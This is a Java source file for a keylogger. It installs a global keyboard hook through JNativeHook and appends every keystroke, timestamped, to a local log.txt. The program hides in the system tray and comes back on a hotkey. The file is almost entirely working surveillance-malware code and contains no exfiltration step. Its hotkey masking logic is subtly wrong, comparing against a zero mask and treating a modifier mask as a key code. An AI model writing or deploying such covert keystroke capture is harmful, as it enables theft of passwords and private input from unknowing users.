package keylogger;

import gui.mainFrame;
import java.io.BufferedWriter;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener{
    private short hotKeyFlag = 0x00;
    private static final short MASK_A = 1 << 0;
    private static final short MASK_W = 1 << 1;
    public KeyLogger(){
    }
    private static OutputStream out;
    private static Date date;
    public static void write(String s){
        try {
            out=new FileOutputStream("log.txt",true);
            date=new Date();
            BufferedWriter writer=new BufferedWriter(new OutputStreamWriter(out));
            writer.write(date.toString()+" : "+s+"\r\n");
            writer.close();
        } catch (FileNotFoundException ex) {
            System.out.println("CANT FINDD FILE");
            Logger.getLogger(KeyLogger.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            System.out.println("IOIOIOIO");
            Logger.getLogger(KeyLogger.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String typed=NativeKeyEvent.getKeyText(e.getKeyCode());
        KeyLogger.write(typed);
        
        
    if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException ex) {
                Logger.getLogger(KeyLogger.class.getName()).log(Level.SEVERE, null, ex);
            }
    }
    else if (e.getKeyCode() == NativeKeyEvent.ALT_L_MASK) {
        hotKeyFlag &= MASK_A;

        // Check the mask and do work.
        if (hotKeyFlag == (MASK_A & MASK_W)) {
            KeyFunctions.maximizeFromTray(mainFrame.frame);
            KeyFunctions.visible(mainFrame.frame, mainFrame.st, mainFrame.myTray);
        }
    }
    else if (e.getKeyCode() == NativeKeyEvent.VC_COMMA) {
        hotKeyFlag &= MASK_W;

        // Check the mask and do work.
        if (hotKeyFlag == (MASK_A & MASK_W)) {
            KeyFunctions.maximizeFromTray(mainFrame.frame);
            KeyFunctions.visible(mainFrame.frame, mainFrame.st, mainFrame.myTray);
        }
    }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
            if (e.getKeyCode() == NativeKeyEvent.ALT_L_MASK) {
                    hotKeyFlag ^= MASK_A;
                }
                else if (e.getKeyCode() == NativeKeyEvent.VC_COMMA) {
                    hotKeyFlag ^= MASK_W;
                }
                }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        
    }
    
}